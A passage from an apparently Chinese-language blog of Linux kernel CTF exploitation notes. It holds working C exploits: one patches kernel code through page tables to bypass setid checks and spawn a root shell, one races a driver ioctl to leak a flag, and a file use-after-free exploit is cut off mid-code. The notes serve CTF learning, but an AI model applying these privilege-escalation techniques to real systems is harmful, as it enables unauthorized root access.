</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;pmd_addr: 0x%llx&#34;</span><span class="p">,</span><span class="n">pmd_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;pte_addr: 0x%llx&#34;</span><span class="p">,</span><span class="n">pte_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;page_addr: 0x%llx&#34;</span><span class="p">,</span><span class="n">page_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">mmap_addr</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0xeab50</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">),</span> <span class="sc">&#39;\x90&#39;</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span> <span class="cm">/* nop */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">mmap_addr</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0xeab50</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">            <span class="s">&#34;</span><span class="se">\xf3\x0f\x1e\xfa</span><span class="s">&#34;</span>  <span class="cm">/* endbr64 */</span>
</span></span><span class="line"><span class="cl">            <span class="s">&#34;H</span><span class="se">\xc7\xc0\x01\x00\x00\x00</span><span class="s">&#34;</span>  <span class="cm">/* mov rax, 1 */</span>
</span></span><span class="line"><span class="cl">            <span class="s">&#34;</span><span class="se">\xc3</span><span class="s">&#34;</span><span class="p">,</span> <span class="cm">/* ret */</span>
</span></span><span class="line"><span class="cl">            <span class="mi">12</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">hexdump</span><span class="p">(</span><span class="n">mmap_addr</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0xeab50</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">),</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// __pause(&#34;debug&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">cid</span> <span class="o">=</span> <span class="nf">fork</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">cid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exp</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">wstatus</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">wait</span><span class="p">(</span><span class="n">wstatus</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">WIFEXITED</span><span class="p">(</span><span class="n">wstatus</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">WEXITSTATUS</span><span class="p">(</span><span class="n">wstatus</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">execl</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="s">&#34;sh&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003035-396.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003035-396.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003035-396.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003035-396.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003035-396.png"
        title="image-20240204052258846" /></p>
<p>patch setresuid或者ns_capable_setid</p>
<p><a href="https://elixir.bootlin.com/linux/v6.11.6/source/kernel/sys.c#L676" target="_blank" rel="noopener noreffer ">https://elixir.bootlin.com/linux/v6.11.6/source/kernel/sys.c#L676</a></p>
<p>不同版本可能略有差别，但最终我们都是让ns_capable_setid返回1，即可以运行到commit_creds</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241105033550067.png"
        data-srcset="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241105033550067.png, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241105033550067.png 1.5x, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241105033550067.png 2x"
        data-sizes="auto"
        alt="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241105033550067.png"
        title="image-20241105033550067" /></p>
<h2 id="任意地址读写">任意地址读写</h2>
<h3 id="只有任意地址写">只有任意地址写</h3>
<h3 id="有任意地址读写">有任意地址读写</h3>
<h2 id="非例题">非例题</h2>
<h3 id="条件竞争">条件竞争</h3>
<p>可以使用punch hole或者userfaultfd/fuse等方法，but后面两种限制太大。</p>
<h4 id="0ctf-baby">0ctf-baby</h4>
<p>直接条件竞争栈来leak出flag</p>
<p>假设thread-0恰好在往栈上放地址的时候</p>
<p>另外一个线程thread-1过了check，正在栈上取地址</p>
<p>这时候就有很大几率竞争成功</p>
<blockquote>
<p>Q：why?</p>
<p>A: 暂时猜测一下是同一个进程起thread的kstack是相同的,一会写个poc验证一下</p>
</blockquote>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241025050817009.png"
        data-srcset="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241025050817009.png, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241025050817009.png 1.5x, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241025050817009.png 2x"
        data-sizes="auto"
        alt="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241025050817009.png"
        title="image-20241025050817009" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241025051334550.png"
        data-srcset="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241025051334550.png, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241025051334550.png 1.5x, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241025051334550.png 2x"
        data-sizes="auto"
        alt="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241025051334550.png"
        title="image-20241025051334550" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE         </span><span class="cm">/* See feature_test_macros(7) */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define TRYTIME 0x100
</span></span></span><span class="line"><span class="cl"><span class="cp">#define LEN 0x1000
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">attr</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">finish</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">LEN</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">change_attr_value</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">s</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">attr</span> <span class="o">*</span> <span class="n">s1</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">finish</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">-&gt;</span><span class="n">flag</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">pass</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">s</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">attr</span> <span class="o">*</span> <span class="n">s1</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">TRYTIME</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">s1</span><span class="o">-&gt;</span><span class="n">flag</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">ret</span> <span class="o">=</span> <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1337</span><span class="p">,</span> <span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">check</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">s</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">attr</span> <span class="o">*</span> <span class="n">s1</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">TRYTIME</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">s1</span><span class="o">-&gt;</span><span class="n">flag</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">ret</span> <span class="o">=</span> <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1337</span><span class="p">,</span> <span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">addr_fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/baby&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x6666</span><span class="p">);</span>    
</span></span><span class="line"><span class="cl">    <span class="kt">pthread_t</span> <span class="n">t1</span><span class="p">,</span><span class="n">t2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">attr</span> <span class="n">t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;dmesg &gt; /tmp/record.txt&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/tmp/record.txt&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">lseek</span><span class="p">(</span><span class="n">addr_fd</span><span class="p">,</span><span class="o">-</span><span class="n">LEN</span><span class="p">,</span><span class="n">SEEK_END</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">addr_fd</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">LEN</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">addr_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="s">&#34;Your flag is at &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">idx</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-]Not found addr&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">idx</span><span class="o">+=</span><span class="mi">16</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">addr</span> <span class="o">=</span> <span class="nf">strtoull</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">idx</span><span class="o">+</span><span class="mi">16</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]flag addr: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">t</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="mi">33</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">t</span><span class="p">.</span><span class="n">flag</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">pass</span><span class="p">,</span><span class="o">&amp;</span><span class="n">t</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t2</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">check</span><span class="p">,</span><span class="o">&amp;</span><span class="n">t</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_join</span><span class="p">(</span><span class="n">t1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_join</span><span class="p">(</span><span class="n">t2</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+]result is :&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;dmesg |grep flag&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="kernel-2">kernel-2</h4>
<h3 id="file_struct-uaf">file_struct uaf</h3>
<h4 id="kernel-1">kernel-1</h4>
<h5 id="方法1-1">方法1</h5>
<p>mmap映射，然后替换凭证</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;banzi.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/prctl.h&gt;  /* Definition of PR_* constants */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">set_cpu_affinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">getpid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/fileManager&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">uaf_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/tmp/uaf&#34;</span><span class="p">,</span><span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span><span class="mo">0666</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">uaf_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">uaf_fd</span><span class="p">,</span><span class="s">&#34;hhhhhhhhhhhhhhhh&#34;</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span><span class="n">MAP_SHARED</span><span class="p">,</span><span class="n">uaf_fd</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">ptr</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fds</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x5555</span><span class="p">,</span><span class="n">uaf_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x6666</span><span class="p">,</span><span class="n">uaf_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/happy&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
